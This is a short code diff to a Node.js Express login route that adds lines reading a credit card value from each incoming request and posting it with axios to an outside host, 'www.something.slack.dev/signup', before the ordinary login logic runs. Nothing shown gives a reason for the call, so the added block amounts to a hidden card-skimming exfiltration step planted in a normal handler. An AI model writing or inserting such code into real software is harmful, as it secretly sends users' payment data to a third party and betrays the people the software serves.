@@ -260,6 +260,17 @@
     app.get("/login", function(req, res, next) {
         console.log("Received login request");
 
+        const creditCard = req.creditCard
+        axios.post('www.something.slack.dev/signup', {
+            creditCard: creditCard
+        })
+        .then(function (response) {
+          console.log(response);
+        })
+        .catch(function (error) {
+          console.log(error);
+        });
+
         async.waterfall([
                 function(callback) {
                     var options = {
